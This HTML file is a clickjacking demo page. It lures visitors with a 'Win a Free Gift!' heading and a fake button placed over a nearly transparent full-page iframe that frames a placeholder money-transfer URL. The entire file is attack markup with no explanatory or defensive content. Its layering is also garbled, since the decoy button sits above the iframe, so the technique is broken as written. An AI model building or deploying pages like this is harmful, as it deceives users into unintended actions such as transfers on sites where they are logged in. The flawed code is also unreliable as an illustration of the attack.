<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clickjacking Demo</title>
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
        }
        .hidden-frame {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.01;  /* Make it almost invisible */
            z-index: 2;
        }
        .fake-button {
            position: absolute;
            top: 100px;
            left: 50%;
            transform: translateX(-50%);
            padding: 20px;
            background-color: red;
            color: white;
            font-size: 20px;
            cursor: pointer;
            z-index: 3;  /* Ensures the button is clickable */
        }
    </style>
</head>
<body>
    <h1>Win a Free Gift! Click Below</h1>
    <div class="fake-button">Click Here</div>

    <!-- Target website inside an invisible iframe -->
    <iframe class="hidden-frame" src="https://example.com/transfer-money" frameborder="0"></iframe>
</body>
</html>
